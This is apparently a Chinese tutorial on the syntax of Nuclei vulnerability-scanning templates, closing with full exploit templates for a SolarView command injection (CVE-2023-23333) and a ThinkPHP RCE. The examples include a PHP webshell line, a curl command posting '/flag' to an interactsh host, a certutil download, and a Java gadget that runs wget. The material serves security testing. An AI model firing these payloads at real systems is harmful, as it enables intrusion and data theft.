# Nuclei YAML 语法模版

YAML 是一种数据序列化语言，通常用于编写配置文件。它的基本语法规则如下

>   * 大小写敏感
>
>   * 使用缩进表示层级关系
>
>   * 缩进时不允许使用 Tab 键，只允许使用空格。
>
>   * 缩进的空格数目不重要，只要相同层级的元素左侧对齐即可
>
>

YAML 支持的数据结构有三种。

>   * 对象：键值对的集合，使用冒号结构表示。
>
>   * 数组：一组按次序排列的值，又称为序列（sequence） /
> 列表（list）。一组连词线开头的行，构成一个数组。如果数据结构的子成员是一个数组，则可以在该项下面缩进一个空格。
>
>   * 纯量（scalars）：单个的、不可再分的值，如字符串、整数、布尔值等。
>
>

更多YAML语法详细参考：[菜鸟教程](https://www.runoob.com/w3cnote/yaml-intro.html)

yaml不用深入了解，了解个大概即可，编写nuclei templates用到的语法比较简单

首先是基本框架:

所有的脚本都可以围绕着这个基本框架展开的

    
    
    id: str  # 模版的唯一ID，必要字段。
    info: 
    	k: v  # 漏洞信息字段，包含漏洞名称、作者、漏洞严重性、漏洞描述、引用连接、评分、漏洞标签等，基本都是可选字段。
    variables:  #(可选值)
    	k: v  # 全局变量，值可以是一个字符串或者一个表达式，可选字段
    requests: []  # 定义的 HTTP 请求（核心部分）,并对返回任用进行匹配，然后确定目标是否存在漏洞
    

## 模板参数

### id

每一个模板都有一个 **id** ，这个id是必选参数，也必须是唯一的不能重复,并且所有的templates都必须以.yaml结尾

    
    
    id: CVE-2023-23333
    

其中id 内容中不得包含空格，否则解析将会失败

### info

info，就是Information的简写，包含了模板的信息， **name** , **author** , **severity** ,
**description** , **reference** , **tags** 等

    
    
    info:
    	name: SolarView任意文件下载            #脚本的名字
    	author:Nacl                            #作者
    	severity:high                          #安全级别  可选的有 info, low, medium, high, critical, unknown
    	description: |                         # 描述，加个|可以进行换行
    	Contec SolarView Compact是日本Contec公司的一个应用系统。提供光伏发电测量系统。攻击者利用该漏洞通过downloader.php绕过内部限制来执行命令。
    	reference:                             # 链接来源，参考链接
    	  - https://mp.weixin.qq.com/s/nXJ3tLIpDvYmnejy_NSmzQ
    	tags: cve,cve2023,solarview,rce        # 标签，nuclei可以根据标签来打poc
    

ps: 创建模板时必须包含`id`, `name`, `authors``severity`，否则模板将无法运行！！！

### requests

这一块是核心，nuclei全部的请求都是基于这一块

requests 的语法如下，它的每个元素都包含单/多个 HTTP
请求、payloads（可选）、匹配规则、解压规则（可选）。大多数情况下定义一个就足够了。  
定义 http 请求支持两种方式，  
1、直接提供 http 原始请求  
2、分别定义 method、path、headers、body 等；

    
    
    requests: # 也可以写作 http:
      # 方式一：原始（raw）请求
      - raw:
          - |
            GET /index.php HTTP/1.1   
            Host: {{Hostname}}
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
            
          - |
            POST /index.php HTTP/1.1
            Host: {{Hostname}}
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
            Accept-Language: en
            Content-type: application/x-www-form-urlencoded
            
            ...
      # 方式二：GET, POST, PUT, DELETE 请求
      - method: GET
        path:
          - "{{BaseURL}}/login.php"
          - "{{BaseURL}}/index.php"  
        headers:
            User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
            cmd: "test123"  
    

请求中会包含 `{{变量名或表达式}}`的动态值，变量命名由 variables、payloads、extractors 解压出来的值、目标url等一起提供  
比如：验证token的正确性

#### variables

定义一个变量

    
    
    variables:
    	token:"ABCDEFG"   
    
    requests:
      - raw:
          # 此请求将被发送到https://api.target.com:443来验证令牌
          - |
            @Host: https://api.target.com:443
            GET /api/key={{token}} HTTP/1.1
            Host: api.target.com:443
        matchers:
          - type: word
            part: body
            words:
              - valid token
    

#### payloads

下面这个demo用于爆破目录，稍微改改也能实现根据用户名爆破密码

    
    
    http:
      - raw:
          - |+
            GET /{{path}} HTTP/1.1
            Host: {{Hostname}}
            Referer: {{BaseURL}}
    
        attack: batteringram
        payloads:
          path: path_wordlist.txt
    
        unsafe: true
        pipeline: true               # 启用了HTTP 管道，允许在同一连接上发送多个 HTTP 请求
        pipeline-concurrent-connections: 40 
        pipeline-requests-per-connection: 25000
    
        matchers:
          - type: status
            part: header
            status:
              - 200
    

#### extractors

适用于匹配的值会动态变化

    
    
    requests:
      - raw:
          # 此请求将被发送到{{Hostname}}以获取令牌
          - |
            GET /getkey HTTP/1.1
            Host: {{Hostname}}
    
          # 此请求将被发送到https://api.target.com:443来验证令牌
          - |
            @Host: https://api.target.com:443
            GET /api/key={{token}} HTTP/1.1
            Host: api.target.com:443
    
        extractors:
          - type: regex
            name: token
            part: body
            internal: true # 动态变量 避免在终端中打印提取的值
            regex:
              # 根据前缀和后缀用正则来提取动态的token
              - 'prefix(.*)suffix'
    
        matchers:
          - type: word
            part: body
            words:
              - valid token
    

extractors 的匹配方式还能细化  
1、regex，正则提取；  
将提取的api 通过POST 请求 发送到 127.0.0.1:801(@Host)

    
    
    requests:
      - raw: 
           - |
            GET /index.html HTTP/1.1
            Host:{{Hostname}}
            User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
            Accept: "123"
            
           - |
            @Host: http://127.0.0.1:801 
            POST / HTTP/1.1
            Host:{{Hostname}}
            User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
            Accept: ""
            
            {{api}}
            
        extractors:
          - type: regex
            name: api
            part: body
            internal: true 
            #group: 0
            regex:     
              - "([a-z0-9]{32})"
    

2、kval，`value`/`key=value`，比如提取指定响应头；

    
    
    extractors:
      - type: kval  
    	kval:
    	  - content_type  # 从http响应头中提取content_type所对应的值
    

3、json，使用 jq 的语法提取 json 数据；  
jq 是个非常强大的处理JSON 数据的命令行工具  
jq详细参考：[jq 常用操作](https://mozillazg.com/2018/01/jq-use-examples-cookbook.html)

    
    
    extractors:
      - type: json # type of the extractor
    	part: body
    	name: user
    	json:
    	  - '.[] | .id'  # jq 提取语法
    

例如：  
![a](https://image.3001.net/images/20230704/1688468910_64a3fdae5b45a1015814d.png!small)

4、xpath，使用 xpath 提取 html 响应数据；  
XPath 是一种 路径表达式 ，可以根据xpath节点路径匹配相应的内容  
个人感觉这个配合headless 很适用

    
    
    extractors:
          - type: xpath # type of the extractor
            attribute: href # attribute value to extract (optional)
            xpath:
              - "/html/body/div/p[2]/a"  # xpath value for extraction
    

5、dsl，使用表达式提取。

    
    
    extractors:
      - type: dsl  
    	dsl:
    	  - "len(body)"  # body长度
    

#### matchers

POC的触发规则

1、status，匹配 http 响应状态码；

    
    
    matchers:
      - type: status
        status:   #状态码之间默认是or的关系
          - 200
          - 302
        condition: and        #将默认的 or 的关系改为 and
    

2、size，匹配长度，如 Conteng-Length；

用到的情况不多，一般都有更优的选择

3、word，字符串匹配；

    
    
    matchers:
      - type: word
       words:
         - "[core]"
         - "[config]"
       condition: and
       part: body
    

4、regex，正则匹配；

    
    
    matchers:
      - type: regex
    	part: body
    	regex:
    	  - 'SSH\-([0-9.-A-Za-z_ ]+)'
    

5、binary，二进制数据匹配；

    
    
    matchers:
      - type: binary
        binary:
          - "504B0304" # zip格式
          - "526172211A070100" # RAR格式
          - "FD377A585A0000" # xz tar.xz 格式
        condition: or
        part: body
    

5、dsl，使用表达式进行匹配；

    
    
    matchers:
      - type: dsl
        dsl:
          - "len(body)<1024 && status_code==200" # 状态码为200,body长度小于1024
          - "contains(toupper(body), md5(cookie))" # 检查md5之后的cookie在不在全部转为大写的body中
    

##### matchers-condition

规则之间是OR还是AND

    
    
    matchers-condition: and       # or
    matchers:
      # 对响应 headers 进行字符串匹配
      - type: word
        part: header
        words:
          - "ADMINCONSOLESESSION"
    
      # 对响应 body 进行字符串匹配，且要包含所有子串。
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
          - 'groups='
        condition: and
    
      # 匹配 http 响应状态码
      - type: status
        status:
          - 200
    

以上就是nuclei 脚本的编写

### 保留字

    
    
    {{Hostname}}    # 最常用的
    {{randstr}}     # 随机字符串
    
    {{BaseURL}}     # https://example.com:443/foo/bar.php
    {{RootURL}}     # https://example.com:443
    {{Hostname}}	# example.com:443
    {{Host}}	    # example.com
    {{Port}}	    # 443
    {{Path}}	    # /foo
    {{File}}	    # bar.php
    {{Scheme}}	    # https
    

### Helper functions

目的是为了适应多种环境下的poc书写

    
    
    id: helper-functions-examples
    
    info:
      name: RAW Template with Helper Functions
      author: pdteam
      severity: info
    
    requests:
      - raw:
          - |
            GET / HTTP/1.1
            Host: {{Hostname}}
            01: {{base64("Hello")}}
            02: {{base64(1234)}}
            03: {{base64_decode("SGVsbG8=")}}
            04: {{base64_py("Hello")}}
            05: {{contains("Hello", "lo")}}
            06: {{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64")}}
            07: {{gzip("Hello")}}
            08: {{hex_decode("6161")}}
            09: {{hex_encode("aa")}}
            10: {{html_escape("<body>test</body>")}}
            11: {{html_unescape("&ampltbody&ampgttest&amplt/body&ampgt")}}
            12: {{len("Hello")}}
            13: {{len(5555)}}
            14: {{md5("Hello")}}
            15: {{md5(1234)}}
            16: {{mmh3("Hello")}}
            17: {{print_debug(1+2, "Hello")}}
            18: {{rand_base(5, "abc")}}
            19: {{rand_base(5)}}
            20: {{rand_char("abc")}}
            21: {{rand_char()}}
            22: {{rand_int(1, 10)}}
            23: {{rand_int(10)}}
            24: {{rand_int()}}
            25: {{rand_text_alpha(10, "abc")}}
            26: {{rand_text_alpha(10)}}
            27: {{rand_text_alphanumeric(10, "ab12")}}
            28: {{rand_text_alphanumeric(10)}}
            29: {{rand_text_numeric(10, 123)}}
            30: {{rand_text_numeric(10)}}
            31: {{regex("H([a-z]+)o", "Hello")}}
            32: {{remove_bad_chars("abcd", "bc")}}
            33: {{repeat("../", 5)}}
            34: {{replace("Hello", "He", "Ha")}}
            35: {{replace_regex("He123llo", "(\\d+)", "")}}
            36: {{reverse("abc")}}
            37: {{sha1("Hello")}}
            38: {{sha256("Hello")}}
            39: {{to_lower("HELLO")}}
            40: {{to_upper("hello")}}
            41: {{trim("aaaHelloddd", "ad")}}
            42: {{trim_left("aaaHelloddd", "ad")}}
            43: {{trim_prefix("aaHelloaa", "aa")}}
            44: {{trim_right("aaaHelloddd", "ad")}}
            45: {{trim_space("  Hello  ")}}
            46: {{trim_suffix("aaHelloaa", "aa")}}
            47: {{unix_time(10)}}
            48: {{url_decode("https://projectdiscovery.io?test=1")}}
            49: {{url_encode("https://projectdiscovery.io/test?a=1")}}
            50: {{wait_for(1)}}
    

## 常用demo

Nuclei 支持使用 interact.sh API 内置自动请求关联来实现基于 OOB 的漏洞扫描  
最常用的验证无回显漏洞  
比如 log4j、无回显命令执行、无回显SSRF等  
无回显：  
1.php

    
    
    <?php exec($_POST[1]);?>
    

yaml

    
    
    requests:
      - raw: 
           - |
            POST /1.php HTTP/1.1
            Host:{{Hostname}}
            User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
            Content-type: application/x-www-form-urlencoded
            
            1=curl https://{{interactsh-url}};
        matchers:
          - type: word
            part: interactsh_protocol # 确认是否进行了http请求
            words:
              - "http"
    

![a](https://image.3001.net/images/20230704/1688468911_64a3fdaf1a1dd50b2634a.png!small)

    
    
    requests:
      - raw: 
           - |
            POST /1.php HTTP/1.1
            Host:{{Hostname}}
            User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
            Content-type: application/x-www-form-urlencoded
            
            1=curl https://{{interactsh-url}}/ -F "file=@/flag"
        
        matchers-condition: and
        matchers:
          - type: word
            part: interactsh_protocol  # HTTP 模式
            words:
              - "http"
          - type: word  #同样可以用正则
            part: interactsh_request # 在 request请求匹配 flag{ 
            words:
              - "flag{"
    

这是匹配到的request的结果，可以用 **-debug** 调出来  
![a](https://image.3001.net/images/20230704/1688468911_64a3fdafac540502ebace.png!small)

 **linux**

    
    
    curl https://{{interactsh-url}}
    

**windows**

    
    
    certutil.exe -urlcache -split -f https://{{interactsh-url}} 1.txt
    

### skip-variables-check

请求内容里包含 `{{ }}`时,会被 nuclei 解析为变量,加这个就是告诉nuclei不要解析.

    
    
    requests:
      - method: GET
        path:
          - "{{BaseURL}}"
        headers:
          Cookie: "cmd={{shell_exec('id')}}; "
    
        skip-variables-check: true           # nuclei不要解析
        matchers-condition: and
        matchers:
          - type: status
            status:
              - 200
          - type: regex
            regex:
              - "uid="
            part: body
    

### 匹配时间

可以拿来写 时间盲注的poc

    
    
    matchers:
      - type: dsl
    	dsl:
    	  - 'duration>=6'     #持续时间 6或大于6秒 返回true
    

### 匹配大小

    
    
    matchers:
      - type: dsl
    	dsl:
    	  - "len(body)<130 && status_code==200"
    

### 回显

 **windows 回显**

    
    
    cmd.exe /c set /a 12333*32111
    
    396024963
    

**linux 回显**

    
    
    expr 12333 \* 32111
    
    396024963
    

## 完整exp参考

 **CVE-2023-23333.yaml**

    
    
    id: CVE-2023-23333
    
    info:
      name: SolarView Compact 6.00 - OS Command Injection
      author: Mr-xn
      severity: critical
      description: |
        SolarView Compact 6.00 was discovered to contain a command injection vulnerability, attackers can execute commands by bypassing internal restrictions through downloader.php.
      reference:
        - https://github.com/Timorlover/CVE-2023-23333
        - https://github.com/Mr-xn/CVE-2023-23333
        - https://nvd.nist.gov/vuln/detail/CVE-2023-23333
      classification:
        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
        cvss-score: 9.8
        cve-id: CVE-2023-23333
        cwe-id: CWE-77
        epss-score: 0.95016
      metadata:
        max-request: 1
        verified: true
        shodan-query: http.html:"SolarView Compact"
        fofa-query: body="SolarView Compact" && title="Top"
      tags: cve,cve2023,solarview,rce
    
    variables:
      cmd: "echo+CVE-2023-23333|rev"
    
    http:
      - raw:
          - |
            @timeout: 25s
            GET /downloader.php?file=;{{cmd}} .zip HTTP/1.1
            Host: {{Hostname}}
    
        matchers-condition: and
        matchers:
          - type: regex
            part: body
            regex:
              - '33332-3202-EVC'
    
          - type: word
            part: header
            words:
              - "text/html"
    
          - type: status
            status:
              - 200
    
    

**thinkphp-5022-rce.yaml**

    
    
    id: thinkphp-5022-rce
    
    info:
      name: ThinkPHP - Remote Code Execution
      author: dr_set
      severity: critical
      description: ThinkPHP 5.0.22 and 5.1.29 are susceptible to remote code execution if the website doesn't have mandatory routing enabled, which is the default setting. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
      reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce
      tags: thinkphp,rce
      metadata:
        max-request: 1
    
    http:
      - method: GET
        path:
          - "{{BaseURL}}?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
    
        matchers-condition: and
        matchers:
          - type: word
            words:
              - "PHP Extension"
              - "PHP Version"
              - "ThinkPHP"
            condition: and
    
          - type: status
            status:
              - 200
    

## 参考链接

[nuclei](https://github.com/projectdiscovery/nuclei)

[nuclei-doc](https://nuclei.projectdiscovery.io/templating-guide/)

[学习笔记-nuclei ](https://www.cnblogs.com/haidragon/p/16852363.html)

